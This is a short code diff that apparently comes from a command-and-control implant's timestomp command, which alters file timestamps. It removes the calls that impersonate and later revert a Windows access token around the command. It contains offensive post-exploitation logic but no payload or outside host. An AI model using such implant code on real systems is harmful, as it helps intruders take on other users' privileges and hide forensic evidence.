@@ -19,10 +19,6 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             string response = String.Empty;
-            if (job.task.token != 0)
-            {
-                tokenManager.Impersonate(job.task.token);
-            }
             TimeStompArgs args = JsonSerializer.Deserialize<TimeStompArgs>(job.task.parameters);
             
             
@@ -56,10 +52,6 @@ namespace Agent
             }
 
             await messageManager.Write(response, job.task.id, true);
-            if (job.task.token != 0)
-            {
-                tokenManager.Revert();
-            }
         }
     }
 }
